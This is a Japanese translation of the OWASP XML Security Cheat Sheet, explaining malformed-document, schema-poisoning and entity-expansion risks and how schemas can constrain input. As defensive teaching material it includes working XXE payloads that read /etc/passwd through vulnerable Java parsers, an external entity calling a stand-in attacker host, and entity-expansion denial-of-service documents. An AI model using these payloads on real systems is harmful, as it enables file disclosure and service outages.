# XMLセキュリティチートシート 日本語訳

## Attribution

- Original: XML Security Cheat Sheet
- Source: https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html
- Copyright: Cheat Sheets Series Team
- License: Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)
- License URL: https://creativecommons.org/licenses/by-sa/4.0/
- Changes: Japanese translation added.
- Retrieved: 2026-05-21

## 日本語訳

# XML セキュリティチートシート

## はじめに

XML と XML スキーマの仕様は XML アプリケーションを保護するために必要な手段を提供しますが、同時に複数のセキュリティ上の弱点も含んでいます。これらは、ファイル取得、サーバーサイドリクエストフォージェリ、ポートスキャン、ブルートフォースなど、複数種類の攻撃に悪用される可能性があります。このチートシートでは、ライブラリやソフトウェアで使われる XML のさまざまな機能を攻撃者がどのように悪用できるかを、次の二つの攻撃面に分けて理解できるようにします。

- **不正形式の XML 文書 (Malformed XML Documents)**: アプリケーションが整形式でない XML 文書に遭遇したときに発生する脆弱性を悪用するものです。
- **無効な XML 文書 (Invalid XML Documents)**: 文書が期待された構造を持たないときに発生する脆弱性を悪用するものです。

## 不正形式の XML 文書への対処

### 不正形式の XML 文書の定義

XML 文書が W3C XML 仕様における整形式文書の定義に従っていない場合、その文書は「不正形式」と見なされます。**XML 文書が不正形式である場合、XML パーサは致命的エラーを検出し、実行を停止すべきであり、その文書を追加処理してはならず、アプリケーションはエラーメッセージを表示すべきです。** 不正形式の文書には、終了タグの欠落、要素順序の無意味な構造化、禁止文字の導入など、一つ以上の問題が含まれることがあります。

### 不正形式の XML 文書の取り扱い

**不正形式の文書に対処するため、開発者は W3C 仕様に従い、不正形式の文書の処理に著しい追加時間を要しない XML プロセッサを使用すべきです。** さらに、整形式文書のみを使用し、各要素の内容を検証し、事前定義された境界内の有効な値だけを処理すべきです。

#### 不正形式の XML 文書は追加時間を必要とする

**不正形式の文書は Central Processing Unit (CPU) リソースの消費に影響する可能性があります。** 特定のシナリオでは、不正形式の文書を処理するために必要な時間が、整形式文書の処理時間よりも長くなることがあります。この場合、攻撃者は処理時間の増加を利用する非対称リソース消費攻撃を悪用し、サービス拒否 (Denial of Service: DoS) を引き起こす可能性があります。

**この攻撃の起こりやすさを分析するには、通常の XML 文書にかかる時間と、同じ文書の不正形式版にかかる時間を比較します。** そのうえで、攻撃者が複数の文書を使う XML flood 攻撃とこの脆弱性を組み合わせ、影響を増幅できるかを検討してください。

### 不正形式データを処理するアプリケーション

**一部の XML パーサには、不正形式の文書を復元する能力があります。** 仕様に準拠していない文書であっても、解析できたすべての内容を含む有効なツリーをできる限り返すよう指示できます。**復元プロセスには事前定義された規則がないため、これらのパーサのアプローチと結果は常に同じとは限りません。不正形式の文書を使用すると、データ整合性に関する予期しない問題につながる可能性があります。**

次の二つのシナリオは、復元モードでパーサが分析する攻撃ベクトルを示しています。

#### 不正形式文書から不正形式文書へ

XML 仕様によると、文字列 `--` (二重ハイフン) はコメント内に出現してはなりません。lxml と PHP の復元モードを使用すると、次の文書は復元後も同じままになります。

```xml
<element>
 <!-- one
  <!-- another comment
 comment -->
</element>
```text

#### 整形式文書から正規化された整形式文書へ

一部のパーサは、`CDATA` セクションの内容を正規化することがあります。これは、必須ではないにもかかわらず、`CDATA` セクションに含まれる特殊文字を安全な表現に更新することを意味します。

```xml
<element>
 <![CDATA[<script>a=1;</script>]]>
</element>
```text

`CDATA` セクションの正規化は、パーサ間で共通の規則ではありません。Libxml はこの文書を正準形式に変換する可能性がありますが、整形式ではあっても、状況によっては内容が不正形式と見なされる可能性があります。

```xml
<element>
 &lt;script&gt;a=1;&lt;/script&gt;
</element>
```text

### 強制的な解析への対処

**XML における一般的な強制型攻撃の一つは、対応する終了タグを持たない深くネストされた XML 文書を解析させることです。狙いは、被害者にマシンのリソースを使い切らせ、最終的に枯渇させて、対象にサービス拒否を発生させることです。** Firefox 3.67 における DoS 攻撃の報告には、対応する終了タグを持たない 30,000 個の開始 XML 要素の使用が含まれていました。終了タグを削除すると、同じ結果を達成するために整形式文書の半分のサイズだけで済むため、攻撃が単純になります。処理されるタグ数により、最終的にスタックオーバーフローが発生しました。このような文書の単純化した例は次のようになります。

```xml
<A1>
 <A2>
  <A3>
   ...
    <A30000>
```text

## XML 仕様規則への違反

W3C 仕様に従わないパーサを使用して文書を操作すると、予期しない結果が生じる可能性があります。**ソフトウェアが不正な XML 構造の扱いを適切に検証しない場合、クラッシュやコード実行を達成できる可能性があります。ファジングされた XML 文書をソフトウェアに与えることで、この挙動が露呈する可能性があります。**

## 無効な XML 文書への対処

**攻撃者は、文書に有効な値セットが含まれているかをアプリケーションが検証しないことを悪用するため、予期しない値を文書に導入する可能性があります。** スキーマは文書が有効かどうかを識別するための制約を指定します。有効な文書は整形式であり、スキーマの制約に準拠しています。一つの文書の検証には複数のスキーマを使用でき、これらの制約は単一のスキーマ言語を使用する場合でも、複数のスキーマ言語の強みを利用する場合でも、複数のファイルに現れることがあります。

これらの脆弱性を避けるための推奨事項は、各 XML 文書に対して、( [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) ではなく) 正確に定義された XML Schema を持たせ、不適切なデータ検証の問題を避けるために、すべての情報を適切に制限することです。XML 文書内で提供されるスキーマ参照ではなく、ローカルコピーまたは既知の良好なリポジトリを使用してください。また、参照される XML スキーマファイルについて、リポジトリが侵害される可能性も考慮しながら、整合性チェックを実施してください。XML 文書がリモートスキーマを使用する場合は、攻撃者によるネットワークトラフィックの盗聴を防ぐため、サーバーを安全な暗号化通信のみを使用するよう構成してください。

### スキーマのない文書

ある書店が、Web インターフェースを通じてトランザクションを行う Web サービスを使用しているとします。トランザクション用の XML 文書は、商品に関連する `id` 値と特定の `price` という二つの要素で構成されます。ユーザーは Web インターフェースを使って特定の `id` 値だけを入力できます。

```xml
<buy>
 <id>123</id>
 <price>10</price>
</buy>
```text

**文書構造に制御がない場合、アプリケーションは意図しない結果を伴う別の整形式メッセージも処理してしまう可能性があります。前述の文書には、その内容を処理する基盤アプリケーションの挙動に影響する追加タグを含めることができたかもしれません**。

```xml
<buy>
 <id>123</id><price>0</price><id></id>
 <price>10</price>
</buy>
```text

値 123 が再び `id` として提供されている点に注意してください。ただし、今度は文書に追加の開始タグと終了タグが含まれています。攻撃者は `id` 要素を閉じ、偽の `price` 要素を値 0 に設定します。構造を整形式に保つ最後の手順として、空の `id` 要素を一つ追加します。その後、アプリケーションは `id` の終了タグを追加し、`price` を 10 に設定します。アプリケーションが構造に対する制御を一切行わず、ID と値について最初に提供された値だけを処理する場合、攻撃者は実際には支払わずに本を購入できるようになり、利益を得る可能性があります。

### 制約の弱いスキーマ

**一部のスキーマは、各要素が受け取れるデータ型に対して十分な制約を提供しません。** これは通常、[DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を使用している場合に発生します。DTD は、XML 文書に適用できる制約の種類と比べて、非常に限られた可能性しか持ちません。そのため、他のスキーマ言語を使用すれば容易に制約できる要素や属性内の望ましくない値に、アプリケーションがさらされる可能性があります。次の例では、人物の `age` がインライン [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) スキーマに対して検証されます。

```xml
<!DOCTYPE person [
 <!ELEMENT person (name, age)>
 <!ELEMENT name (#PCDATA)>
 <!ELEMENT age (#PCDATA)>
]>
<person>
 <name>John Doe</name>
 <age>11111..(1.000.000digits)..11111</age>
</person>
```text

前述の文書には、`person` という名前のルート要素を持つインライン [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) が含まれています。この要素には、特定の順序で二つの要素、つまり `name` と `age` が含まれます。その後、`name` 要素は `age` 要素と同様に `PCDATA` を含むよう定義されています。

この定義の後に、整形式かつ有効な XML 文書が始まります。`name` 要素には重要でない値が含まれていますが、`age` 要素には 100 万桁の数字が含まれています。`age` 要素の最大サイズに制約がないため、この 100 万桁の文字列をこの要素としてサーバーに送信できます。

通常、この種の要素は、一定数以下の文字を含むよう制限し、特定の文字セット (たとえば 0 から 9 の数字、プラス記号、マイナス記号) に制約すべきです。適切に制限されていない場合、アプリケーションは文書内に含まれる潜在的に無効な値を扱う可能性があります。

特定の制約 (`name` 要素の最大長や `age` 要素の有効範囲など) を示せないため、この種のスキーマはリソースの完全性と可用性に影響するリスクを高めます。

### 不適切なデータ検証

**スキーマが安全でない形で定義され、厳格な規則を提供しない場合、アプリケーションをさまざまな状況にさらす可能性があります。その結果、内部エラーの開示や、予期しない値によってアプリケーション機能に影響する文書が発生する可能性があります。**

#### 文字列データ型

16 進値を使用する必要がある場合、その値を文字列として定義し、後で特定の 16 個の 16 進文字に制限する意味はありません。このシナリオを例示すると、XML 暗号化を使用する場合、一部の値は base64 でエンコードする必要があります。これらの値がどのように見えるべきかを示すスキーマ定義は次のとおりです。

```xml
<element name="CipherData" type="xenc:CipherDataType"/>
 <complexType name="CipherDataType">
  <choice>
   <element name="CipherValue" type="base64Binary"/>
   <element ref="xenc:CipherReference"/>
  </choice>
 </complexType>
```text

前述のスキーマは、`CipherValue` 要素を base64 データ型として定義しています。一例として、IBM WebSphere DataPower SOA Appliance は、有効な base64 値の後にこの要素内で任意の種類の文字を許可し、それを有効と見なしていました。

このデータの最初の部分は base64 値として適切にチェックされますが、残りの文字はほかの任意のものになり得ます (`CipherData` 要素の別のサブ要素を含む)。要素に対する制約が部分的にしか設定されていないため、情報は提案されたサンプルスキーマではなく、アプリケーションを使ってテストされている可能性があります。

#### 数値データ型

**数値には文字列より多くの選択肢があるため、正しいデータ型を定義することはより複雑になる可能性があります。**

##### 負数と正数の制約

XML Schema の数値データ型には、さまざまな数値範囲を含められます。次のものがあります。

- **negativeInteger**: 負数のみ
- **nonNegativeInteger**: 正数とゼロ値
- **positiveInteger**: 正数のみ
- **nonPositiveInteger**: 負数とゼロ値

次のサンプル文書は、商品の `id`、`price`、および攻撃者の制御下にある `quantity` 値を定義しています。

```xml
<buy>
 <id>1</id>
 <price>10</price>
 <quantity>1</quantity>
</buy>
```text

**過去の誤りを繰り返さないために、攻撃者が追加要素を導入しようとする場合に不正な構造の処理を防ぐ XML スキーマを定義できます。**

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:integer"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>
```text

`quantity` を整数データ型に制限すると、予期しない文字を避けられます。アプリケーションが前述のメッセージを受信すると、`price*quantity` を計算して最終価格を求める可能性があります。**しかし、このデータ型は負の値を許容する可能性があるため、攻撃者が負数を提供するとユーザーアカウントに負の結果を許す可能性があります。この論理的脆弱性を避けるためにここでおそらく必要なのは、integer ではなく positiveInteger です。**

##### ゼロ除算

**ユーザー制御値を除算の分母として使用する場合、開発者はゼロを許可しないようにすべきです。XSLT で値ゼロが除算に使用されると、エラー `FOAR0001` が発生します。ほかのアプリケーションでは別の例外が投げられ、プログラムがクラッシュする可能性があります。** XML スキーマには、ゼロ値の使用を明確に避ける特定のデータ型があります。たとえば、負の値とゼロが有効でない場合、スキーマはその要素に `positiveInteger` データ型を指定できます。

```xml
<xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:positiveInteger"/>
 </xs:simpleType>
</xs:element>
```text

`denominator` 要素は正の整数に制限されます。これは、ゼロより大きい値だけが有効と見なされることを意味します。他の種類の制約が使用されている場合、分母がゼロであればエラーを引き起こす可能性があります。

##### 特殊値: Infinity と Not a Number (NaN)

`float` と `double` データ型には、実数といくつかの特殊値、つまり `-Infinity` または `-INF`、`NaN`、`+Infinity` または `INF` が含まれます。これらの可能性は特定の値を表すのに便利な場合がありますが、誤用されることもあります。問題は、これらが価格などの実数だけを表すためによく使われる点です。これは、これらの技術だけに限定されず、ほかのプログラミング言語でも見られる一般的な誤りです。

データ型で取り得る値の全体像を考慮しないと、基盤アプリケーションが失敗する可能性があります。**特殊値 `Infinity` と `NaN` が不要で、実数だけが期待される場合は、データ型 `decimal` が推奨されます。**

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:positiveInteger"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>
```text

**価格値を Infinity または NaN に設定しても、それらの値は有効ではないため、エラーは引き起こされません。これらの値が許可されている場合、攻撃者はこの問題を悪用できます。**

#### 一般的なデータ制約

適切なデータ型を選択した後、開発者は追加の制約を適用できます。データ型内の特定の値のサブセットだけが有効と見なされる場合があります。

##### 接頭辞付きの値

**一部の種類の値は特定の集合だけに制限すべきです。信号機には三種類の色しかなく、利用可能な月は 12 個だけ、というようなものです。スキーマが各要素または属性についてこれらの制約を備えている可能性があります。これはアプリケーションにとって最も完全な許可リストのシナリオです。特定の値だけが受け入れられます。このような制約は XML スキーマでは `enumeration` と呼ばれます。** 次の例は、month 要素の内容を 12 個の可能な値に制限します。

```xml
<xs:element name="month">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:enumeration value="January"/>
   <xs:enumeration value="February"/>
   <xs:enumeration value="March"/>
   <xs:enumeration value="April"/>
   <xs:enumeration value="May"/>
   <xs:enumeration value="June"/>
   <xs:enumeration value="July"/>
   <xs:enumeration value="August"/>
   <xs:enumeration value="September"/>
   <xs:enumeration value="October"/>
   <xs:enumeration value="November"/>
   <xs:enumeration value="December"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```text

month 要素の値を前述のいずれかの値に制限することで、アプリケーションはランダムな文字列を操作しなくなります。

##### 範囲

ソフトウェアアプリケーション、データベース、プログラミング言語は通常、特定の範囲内に情報を格納します。**特定のサイズが重要な場所で要素または属性を使用する場合 (オーバーフローまたはアンダーフローを避けるため)、データ長が有効と見なされるかどうかをチェックするのは合理的です。** 次のスキーマは、異常なシナリオを避けるため、名前を最小長と最大長で制約できます。

```xml
<xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:minLength value="3"/>
   <xs:maxLength value="256"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```text

可能な値が特定の長さ (たとえば 8) に制限される場合、有効にするために次のようにこの値を指定できます。

```xml
<xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:length value="8"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```text

##### パターン

一部の要素または属性は特定の構文に従うことがあります。XML スキーマを使用する場合、`pattern` 制約を追加できます。**データが特定のパターンに準拠していることを保証したい場合、そのための特定の定義を作成できます。社会保障番号 (SSN) は良い例です。SSN は特定の文字セット、特定の長さ、特定の `pattern` を使用しなければなりません。**

```xml
<xs:element name="SSN">
 <xs:simpleType>
  <xs:restriction base="xs:token">
   <xs:pattern value="[0-9]{3}-[0-9]{2}-[0-9]{4}"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```text

SSN の値としては、`000-00-0000` から `999-99-9999` までの数字だけが許可されます。

##### アサーション

**アサーションコンポーネントは、XML スキーマ上の関連要素と属性の存在および値を制約します。要素または属性は、テストがエラーを発生させずに true と評価された場合にのみ、アサーションに関して有効と見なされます。変数 `$value` を使用して、分析対象の値の内容を参照できます。**

前述の *ゼロ除算* セクションでは、分母にゼロ値を含むデータ型を使用した場合の潜在的な結果を参照し、正の値だけを含むデータ型を提案しました。逆の例として、ゼロを除く数値範囲全体を有効と見なすことが考えられます。潜在的なエラーの開示を避けるため、ゼロを許可しない `assertion` を使用して値をチェックできます。

```xml
<xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:integer">
   <xs:assertion test="$value != 0"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```text

このアサーションは、`denominator` が有効な数値として値ゼロを含まないことを保証し、同時に負数を有効な分母として許可します。

##### 出現回数

**最大出現回数を定義しないことの結果は、処理対象アイテムの極端な数を受け取った場合に起こり得る結果に対処するよりも悪くなる可能性があります。** 最小制限と最大制限を指定する二つの属性は、`minOccurs` と `maxOccurs` です。

`minOccurs` と `maxOccurs` の両方のデフォルト値は `1` ですが、一部の要素には別の値が必要になることがあります。たとえば、値が任意である場合は `minOccurs` に 0 を含められ、最大数に制限がない場合は、次の例のように `maxOccurs` に `unbounded` を含められます。

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="operation">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="buy" maxOccurs="unbounded">
     <xs:complexType>
      <xs:all>
       <xs:element name="id" type="xs:integer"/>
       <xs:element name="price" type="xs:decimal"/>
       <xs:element name="quantity" type="xs:integer"/>
      </xs:all>
     </xs:complexType>
    </xs:element>
  </xs:complexType>
 </xs:element>
</xs:schema>
```text

前述のスキーマには `operation` という名前のルート要素が含まれ、その中に無制限 (`unbounded`) の buy 要素を含められます。開発者は通常、出現回数の最大値を制限したがらないため、これは一般的な所見です。**無制限の出現回数を使用するアプリケーションは、処理対象となる非常に大量の要素を受信した場合に何が起こるかをテストすべきです。計算リソースは有限であるため、結果を分析し、最終的には `unbounded` 値ではなく最大数を使用すべきです。**

### ジャンボペイロード

**1GB の XML 文書を送信してもサーバー処理は 1 秒しか必要とせず、攻撃として検討する価値がない場合があります。その代わり、攻撃者はこの種の攻撃を生成するために使用する CPU とトラフィックを、サーバーがリクエストを処理するために使用する総 CPU またはトラフィック量と比べて最小化する方法を探します。**

#### 従来型ジャンボペイロード

**文書を通常より大きくする主な方法は二つあります。**

**- 深さ攻撃: 大量の要素、要素名、要素値を使用します。**

**- 幅攻撃: 大量の属性、属性名、属性値を使用します。**

ほとんどの場合、全体として巨大な文書になります。これはどのように見えるかを示す短い例です。

```xml
<SOAPENV:ENVELOPE XMLNS:SOAPENV="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/"
                  XMLNS:EXT="HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL">
 <SOAPENV:HEADER LARGENAME1="LARGEVALUE"
                 LARGENAME2="LARGEVALUE2"
                 LARGENAME3="LARGEVALUE3" …>
 ...
```text

#### 「小さな」ジャンボペイロード

**次の例は非常に小さな文書ですが、これを処理した結果は従来型ジャンボペイロードを処理した場合と似たものになる可能性があります。** このような小さなペイロードの目的は、攻撃者が十分な速さで多数の文書を送信し、アプリケーションに利用可能なリソースの大部分またはすべてを消費させられるようにすることです。

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
 <!ENTITY file SYSTEM "http://attacker/huge.xml" >
]>
<root>&file;</root>
```text

### スキーマポイズニング

**攻撃者がスキーマに変更を導入できる場合、複数の高リスクな結果が生じる可能性があります。特に、スキーマが [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を使用している場合、その結果の影響はより危険になります (例: ファイル取得、サービス拒否)。** 攻撃者は、常にスキーマの場所に依存しながら、多数のシナリオでこの種の脆弱性を悪用できます。

#### ローカルスキーマポイズニング

**ローカルスキーマポイズニングは、スキーマが同じホスト上で利用可能な場合に発生します。そのスキーマが同じ XML 文書に埋め込まれているかどうかは問いません。**

##### 埋め込みスキーマ

**最も単純なスキーマポイズニングは、スキーマが同じ XML 文書内に定義されている場合に発生します。** W3C が提供した、意図せず脆弱な次の例を考えてください。

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
 <!ELEMENT note (to,from,heading,body)>
 <!ELEMENT to (#PCDATA)>
 <!ELEMENT from (#PCDATA)>
 <!ELEMENT heading (#PCDATA)>
 <!ELEMENT body (#PCDATA)>
]>
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```text

note 要素に対するすべての制約を削除または変更でき、任意の種類のデータをサーバーに送信できるようになります。さらに、サーバーが外部エンティティを処理している場合、攻撃者はスキーマを使って、たとえばサーバーからリモートファイルを読み取ることができます。**この種のスキーマは文書送信用の提案としてしか機能しないため、安全に使用するには埋め込みスキーマの整合性をチェックする方法を含めなければなりません。埋め込みスキーマを通じた攻撃は、外部エンティティ展開の悪用によく使われます。埋め込み XML スキーマは、内部ホストのポートスキャンやブルートフォース攻撃にも役立つ可能性があります。**

##### 不適切な権限

**ローカルスキーマを処理することで、リモートで改ざんされたバージョンを使用するリスクを回避できることがよくあります。**

```xml
<!DOCTYPE note SYSTEM "note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```text

**しかし、ローカルスキーマに正しい権限が設定されていない場合、内部攻撃者が元の制約を変更できる可能性があります。** 次の行は、任意のユーザーが変更できる権限を持つスキーマの例です。

```text
-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
```text

`name.dtd` に設定された権限により、システム上の任意のユーザーが変更を加えられます。この脆弱性は XML やスキーマの構造とは明らかに関係ありませんが、これらの文書は一般にファイルシステムに保存されるため、攻撃者がこの種の問題を悪用できることは言及する価値があります。

#### リモートスキーマポイズニング

**外部組織によって定義されるスキーマは通常、リモートで参照されます。攻撃者がネットワークトラフィックを迂回またはアクセスできる場合、本来意図されたものとは異なる種類のコンテンツを被害者に取得させる可能性があります。**

##### Man-in-the-Middle (MitM) 攻撃

文書が暗号化されていない Hypertext Transfer Protocol (HTTP) を使用してリモートスキーマを参照する場合、通信は平文で行われ、攻撃者はトラフィックを容易に改ざんできます。**XML 文書が HTTP 接続を使用してリモートスキーマを参照する場合、その接続はエンドユーザーに届く前に盗聴および変更される可能性があります。**

```xml
<!DOCTYPE note SYSTEM "http://example.com/note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```bash

リモートファイル `note.dtd` は、暗号化されていない HTTP プロトコルで送信される場合、改ざんされやすい可能性があります。この種の攻撃を容易にするために利用できるツールの一つが mitmproxy です。

##### DNS キャッシュポイズニング

リモートスキーマポイズニングは、Hypertext Transfer Protocol Secure (HTTPS) のような暗号化プロトコルを使用している場合でも可能なことがあります。**ソフトウェアが IP アドレスに対して逆 Domain Name System (DNS) 解決を実行してホスト名を取得する場合、その IP アドレスが本当にそのホスト名に関連付けられていることを適切に保証しない可能性があります。** この場合、ソフトウェアは攻撃者がコンテンツを自分の Internet Protocol (IP) アドレスにリダイレクトできるようにします。

前述の例では、暗号化されていないプロトコルを使用してホスト `example.com` を参照していました。

HTTPS に切り替えると、リモートスキーマの場所は `https://example/note.dtd` のようになります。通常のシナリオでは、`example.com` の IP は `1.1.1.1` に解決されます。

```bash
$ host example.com
example.com has address 1.1.1.1
```bash

攻撃者が使用中の DNS を侵害すると、前述のホスト名は攻撃者が制御する新しい別の IP `2.2.2.2` を指す可能性があります。

```bash
$ host example.com
example.com has address 2.2.2.2
```text

リモートファイルにアクセスすると、被害者は実際には攻撃者が制御する場所の内容を取得している可能性があります。

##### 悪意ある従業員による攻撃

第三者がスキーマをホストして定義している場合、その内容はスキーマ利用者の管理下にはありません。**悪意ある従業員、またはこれらのファイルを制御する外部攻撃者によって導入された変更は、スキーマを処理するすべてのユーザーに影響する可能性があります。その後、攻撃者はほかのサービスの機密性、完全性、可用性に影響を与える可能性があります (特に使用中のスキーマが [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) の場合)。**

### XML エンティティ展開

**パーサが [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を使用する場合、攻撃者は文書処理中に XML パーサへ悪影響を与える可能性のあるデータを注入するかもしれません。これらの悪影響には、パーサのクラッシュやローカルファイルへのアクセスが含まれる可能性があります。**

#### 脆弱な Java 実装のサンプル

**ローカルまたはリモートファイルを参照する [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) の機能を使用すると、ファイルの機密性に影響を与えることが可能です。** さらに、エンティティ展開に適切な制約が設定されていない場合、リソースの可用性にも影響を与えることが可能です。XXE の次のサンプルコードを考えてください。

**サンプル XML**:

```xml
<!DOCTYPE contacts SYSTEM "contacts.dtd">
<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>&xxe;</lastname>
 </contact>
</contacts>
```text

**サンプル DTD**:

```xml
<!ELEMENT contacts (contact*)>
<!ELEMENT contact (firstname,lastname)>
<!ELEMENT firstname (#PCDATA)>
<!ELEMENT lastname ANY>
<!ENTITY xxe SYSTEM "/etc/passwd">
```text

##### DOM を使った XXE

```java
import java.io.IOException;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.xml.sax.InputSource;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

public class parseDocument {
 public static void main(String[] args) {
  try {
   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
   DocumentBuilder builder = factory.newDocumentBuilder();
   Document doc = builder.parse(new InputSource("contacts.xml"));
   NodeList nodeList = doc.getElementsByTagName("contact");
   for (int s = 0; s < nodeList.getLength(); s++) {
     Node firstNode = nodeList.item(s);
     if (firstNode.getNodeType() == Node.ELEMENT_NODE) {
       Element firstElement = (Element) firstNode;
       NodeList firstNameElementList = firstElement.getElementsByTagName("firstname");
       Element firstNameElement = (Element) firstNameElementList.item(0);
       NodeList firstName = firstNameElement.getChildNodes();
       System.out.println("First Name: "  + ((Node) firstName.item(0)).getNodeValue());
       NodeList lastNameElementList = firstElement.getElementsByTagName("lastname");
       Element lastNameElement = (Element) lastNameElementList.item(0);
       NodeList lastName = lastNameElement.getChildNodes();
       System.out.println("Last Name: " + ((Node) lastName.item(0)).getNodeValue());
     }
    }
  } catch (Exception e) {
    e.printStackTrace();
  }
 }
}
```bash

前述のコードは次の出力を生成します。

```bash
$ javac parseDocument.java ; java parseDocument
First Name: John
Last Name: ### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```text

##### DOM4J を使った XXE

```java
import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.io.SAXReader;
import org.dom4j.io.OutputFormat;
import org.dom4j.io.XMLWriter;

public class test1 {
 public static void main(String[] args) {
  Document document = null;
  try {
   SAXReader reader = new SAXReader();
   document = reader.read("contacts.xml");
  } catch (Exception e) {
   e.printStackTrace();
  }
  OutputFormat format = OutputFormat.createPrettyPrint();
  try {
   XMLWriter writer = new XMLWriter( System.out, format );
   writer.write( document );
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}
```bash

前述のコードは次の出力を生成します。

```bash
$ java test1
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE contacts SYSTEM "contacts.dtd">

<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```text

##### SAX を使った XXE

```java
import java.io.IOException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

public class parseDocument extends DefaultHandler {
 public static void main(String[] args) {
  new parseDocument();
 }
 public parseDocument() {
  try {
   SAXParserFactory factory = SAXParserFactory.newInstance();
   SAXParser parser = factory.newSAXParser();
   parser.parse("contacts.xml", this);
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
 @Override
 public void characters(char[] ac, int i, int j) throws SAXException {
  String tmpValue = new String(ac, i, j);
  System.out.println(tmpValue);
 }
}
```bash

前述のコードは次の出力を生成します。

```bash
$ java parseDocument
John
#### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```text

##### StAX を使った XXE

```java
import javax.xml.parsers.SAXParserFactory;
import javax.xml.stream.XMLStreamReader;
import javax.xml.stream.XMLInputFactory;
import java.io.File;
import java.io.FileReader;
import java.io.FileInputStream;

public class parseDocument {
 public static void main(String[] args) {
  try {
   XMLInputFactory xmlif = XMLInputFactory.newInstance();
   FileReader fr = new FileReader("contacts.xml");
   File file = new File("contacts.xml");
   XMLStreamReader xmlfer = xmlif.createXMLStreamReader("contacts.xml",
                                            new FileInputStream(file));
   int eventType = xmlfer.getEventType();
   while (xmlfer.hasNext()) {
    eventType = xmlfer.next();
    if(xmlfer.hasText()){
     System.out.print(xmlfer.getText());
    }
   }
   fr.close();
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}

```bash

前述のコードは次の出力を生成します。

```bash
$ java parseDocument
<!DOCTYPE contacts SYSTEM "contacts.dtd">John### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```text

#### 再帰的エンティティ参照

**要素 `A` の定義が別の要素 `B` であり、その要素 `B` が要素 `A` として定義されている場合、そのスキーマは要素間の循環参照を表します。**

```xml
<!DOCTYPE A [
 <!ELEMENT A ANY>
 <!ENTITY A "<A>&B;</A>">
 <!ENTITY B "&A;">
]>
<A>&A;</A>
```text

#### 二次的爆発

**このシナリオでは、攻撃者は複数の小さく深くネストされたエンティティを定義する代わりに、一つの非常に大きなエンティティを定義し、それを可能な限り何度も参照します。その結果、二次的な展開 (*O(n^2)*) が発生します。**

次の攻撃の結果は、メモリ上で 100,000 x 100,000 文字になります。

```xml
<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY A "AAAAA...(a 100.000 A's)...AAAAA">
]>
<root>&A;&A;&A;&A;...(a 100.000 &A;'s)...&A;&A;&A;&A;&A;</root>
```text

#### Billion Laughs

